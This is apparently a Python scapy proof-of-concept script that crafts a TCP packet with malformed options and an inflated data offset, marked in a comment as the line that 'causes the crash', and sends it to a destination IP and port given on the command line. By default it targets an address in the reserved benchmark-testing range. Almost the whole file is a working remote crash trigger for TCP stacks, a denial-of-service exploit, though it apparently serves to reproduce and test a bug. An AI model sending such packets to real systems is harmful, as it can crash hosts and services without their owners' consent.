#!/usr/bin/python
"""
 Want to construct a:
  TCP packet with wrong TCP options

Usage:
    -s source IP address
    -d dest   IP address
    -p dest port

"""

import getopt
import sys

from scapy.all import *

srcip = None
dstip = None
dstport = 666

#NetRange:       198.18.0.0 - 198.19.255.255
#CIDR:           198.18.0.0/15
#OriginAS:
#NetName:        SPECIAL-IPV4-BENCHMARK-TESTING-IANA-RESERVED
dstip = "198.18.0.1"

def send_tcp_packet(srcip,dstip,dst_port):

    ip=IP(dst=dstip, ttl=4)

    tcp1=TCP(dport=dstport)

    tcp1.options= [('MSS', '\x41'), ('NOP', None), ('EOL', None)]
    tcp1.dataofs = 8 # <-- causes the crash

    packet1=(ip/tcp1)
    packet1.show()

    print "Sending TCP packet(s)"
    send(packet1)


if __name__ == "__main__":
    def usage(msg=None):
        if msg: sys.stderr.write('%s: %s\n' % (sys.argv[0], msg))
        sys.stderr.write(__doc__)
        sys.exit(1)

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hs:d:p:')
        for o, a in opts:
            if o == '-h': usage()
            elif o == '-s': srcip = a
            elif o == '-d': dstip = a
            elif o == '-p': dstport = a
            else: raise Warning, 'EDOOFUS - Programming error'
    except getopt.GetoptError, e:
        usage(e)

    if not dstip:
        usage("Must specify destination (-d)")

    send_tcp_packet(srcip,dstip,dstport)
